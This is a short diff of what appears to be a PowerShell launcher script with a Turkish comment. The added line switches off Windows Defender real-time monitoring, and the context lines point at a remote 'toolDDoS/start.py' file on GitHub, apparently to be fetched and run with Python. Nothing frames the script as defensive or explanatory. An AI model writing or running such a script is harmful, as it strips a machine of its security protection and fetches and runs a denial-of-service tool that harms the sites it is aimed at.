@@ -1,3 +1,4 @@
+Set-MpPreference -DisableRealtimeMonitoring $true
 $python = "python"  # Python PATH’te yoksa tam yolunu yaz
 $url = "https://raw.githubusercontent.com/doguiaste/toolDDoS/main/start.py"
 
